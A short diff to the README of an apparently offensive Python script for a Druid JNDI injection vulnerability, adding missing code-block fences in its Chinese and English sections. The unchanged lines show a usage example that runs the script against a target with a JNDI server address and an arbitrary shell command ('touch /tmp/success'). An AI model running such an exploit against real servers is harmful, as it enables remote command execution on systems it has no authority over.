@@ -14,6 +14,7 @@ This project is a Python script that exploits the Druid JNDI injection vulnerabi
 
 ```bash
 python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
+```
 使用该脚本需要先安装 Python 3 和 requests 库。
 
 ## 注意事项
@@ -34,6 +35,7 @@ To use this script, you need to provide the following parameters:
 
 ```bash
 python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
+```
 To use this script, you need to install Python 3 and the requests library first.
 
 ## Disclaimer
